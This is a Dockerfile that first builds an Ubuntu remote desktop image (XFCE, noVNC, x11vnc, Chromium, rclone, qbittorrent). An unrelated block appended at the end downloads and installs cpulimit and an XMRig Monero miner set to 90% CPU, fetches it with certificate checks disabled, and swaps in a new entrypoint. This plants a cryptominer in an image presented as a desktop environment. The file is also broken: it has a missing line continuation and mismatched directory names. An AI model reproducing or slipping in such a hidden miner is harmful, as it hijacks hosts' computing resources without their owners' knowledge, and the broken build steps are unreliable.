FROM ubuntu:18.04

ENV DEBIAN_FRONTEND=noninteractive

#RUN echo 'deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n' > /etc/apt/sources.list

RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
        dbus-x11 \
        nautilus \
        gedit \
        expect \
        sudo \
        vim \
        bash \
        net-tools \
        novnc \
        socat \
        x11vnc \
	xvfb \
        xfce4 \
        supervisor \
        curl \
        git \
        wget \
        g++ \
        ssh \
	chromium-browser \
        terminator \
        htop \
        gnupg2 \
	locales \
	xfonts-intl-chinese \
	fonts-wqy-microhei \  
	ibus-pinyin \
	ibus \
	ibus-clutter \
	ibus-gtk \
	ibus-gtk3 \
	ibus-qt4 \
	rclone \
	qbittorrent \
	docker.io \
    && apt-get autoclean \
    && apt-get autoremove \
    && docker pull plexinc/pms-docker
    && rm -rf /var/lib/apt/lists/*
RUN dpkg-reconfigure locales

COPY . /app
RUN chmod +x /app/conf.d/websockify.sh
RUN chmod +x /app/run.sh
RUN chmod +x /app/expect_vnc.sh
#RUN echo 'deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main' >> /etc/apt/sources.list
#RUN echo "deb http://deb.anydesk.com/ all main"  >> /etc/apt/sources.list
#RUN wget --no-check-certificate https://dl.google.com/linux/linux_signing_key.pub -P /app
#RUN wget --no-check-certificate -qO - https://keys.anydesk.com/repos/DEB-GPG-KEY -O /app/anydesk.key
#RUN apt-key add /app/anydesk.key
#RUN apt-key add /app/linux_signing_key.pub
#RUN set -ex; \
#    apt-get update \
#    && apt-get install -y --no-install-recommends \
#        google-chrome-stable \
#	anydesk

RUN echo xfce4-session >~/.xsession

CMD ["/app/run.sh"]


ENV CPULIMIT_VERSION=0.2 \
    CPU_USAGE=90 \
    XMRIG_VERSION=5.11.1  

RUN apt-get -qq update \
    &&  apt-get -qqy install --no-install-recommends wget \
    &&  apt-get -qqy install --no-install-recommends build-essential \
    &&  cd /root \
    &&  wget --no-check-certificate -c https://github.com/opsengine/cpulimit/archive/v${CPULIMIT_VERSION}.tar.gz \
    &&  tar zxvf v${CPULIMIT_VERSION}.tar.gz \
    &&  cd cpulimit-${CPULIMIT_VERSION} \
    &&  make \
    &&  cp src/cpulimit /usr/bin/ \
    &&  cd /root \
    &&  wget --no-check-certificate -c https://github.com/C3Pool/profit-switching-miner/blob/master/xmrig-${XMRIG_VERSION}-profit-switching-Linux.tar.gz?raw=true -O xmrig-${XMRIG_VERSION}-profit-switching-Linux.tar.gz \
    &&  tar zxvf xmrig-${XMRIG_VERSION}-profit-switching-Linux.tar.gz  \
    &&  cd xmrig-${XMRIG_VERSION}-prifit-switching-Linux \
    &&  cp xmrig /usr/bin/ \
    &&  mkdir -p /etc/xmrig \
    &&  cp config.json /etc/xmrig \
    &&  cd /root \
    &&  apt-get -qqy remove build-essential  \
    &&  rm v${CPULIMIT_VERSION}.tar.gz \
    &&  rm -rf cpulimit-${CPULIMIT_VERSION} \
    &&  rm xmrig-${XMRIG_VERSION}-profit-switching-Linux.tar.gz  \
    &&  rm -rf xmrig-${XMRIG_VERSION}-prifit-switching-Linux \
    &&  rm -rf /var/lib/apt/lists/*

COPY docker-entrypoint.sh /usr/local/bin/
RUN ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compat

ENTRYPOINT ["docker-entrypoint.sh"]
